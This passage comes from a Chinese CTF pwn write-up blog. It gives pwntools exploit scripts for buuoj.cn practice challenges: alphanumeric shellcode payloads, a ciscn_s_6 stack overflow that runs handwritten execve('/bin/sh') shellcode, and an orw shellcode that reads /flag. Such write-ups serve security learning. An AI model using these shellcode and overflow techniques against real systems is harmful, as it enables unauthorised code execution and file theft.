class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">shellcode1 = asm(shellcode1)</span></span><br><span class="line"><span class="string">print(shellcode1)</span></span><br><span class="line"><span class="string">payload1 = &#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload = &#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M150m0M0R2o7O2q0H0k10030O2J142M0H2N160Y0m0H18140l07121L0m0L121M0c7L0m1O0m0N0V0o11010H2L130R2j0l0l2t100Q0m0J110y2Z0m&#x27;</span></span><br><span class="line"><span class="string">r.send(payload1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">r.interactive()</span></span><br></pre></td></tr></table></figure>
<h4 id="ciscn-s-6"><a class="header-anchor" href="#ciscn-s-6">¶</a>ciscn_s_6</h4>
<p>IDA分析<br>
<img src="http://static.zybuluo.com/hgggg/geyqzixywspeaygt9mbfbt63/4.png" alt="4.png-31.2kB"></p>
<p><img src="http://static.zybuluo.com/hgggg/8fpecaqjnig5pzidt5eziv8c/5.png" alt="5.png-14.8kB"><br>
思路</p>
<pre><code>pwn函数存在明显的栈溢出，我们可以通过读入shellcode并将返回地址覆盖为jmp esp之后去调用之前的shellcode
由于输入长度限制，本题需手写shellcode
</code></pre>
<h5 id="exp-v3"><a class="header-anchor" href="#exp-v3">¶</a>exp</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x8048554</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26139</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;ciscn_s_9&#x27;)</span></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode =<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">push edx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">mov al,0xb</span></span><br><span class="line"><span class="string">int 0x80                </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line">payload = shellcode.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p32(<span class="number">0</span>) +p32(ret_addr) + asm(<span class="string">&quot;sub esp,40;call esp&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>####pwnable_orw<br>
题目分析<br>
<img src="images/6.png" alt="pic"></p>
<p><img src="images/7.png" alt="pic"></p>
<p>查看沙盒<br>
<img src="images/8.png" alt="pic"></p>
<p>发现只能使用open,read,write,那么我们就可以通过open(file)+read(file)+write(file)来实现任意文件读取</p>
<h5 id="exp-v4"><a class="header-anchor" href="#exp-v4">¶</a>exp</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25539</span>)</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&#x27;orw&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;orw&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
</search>
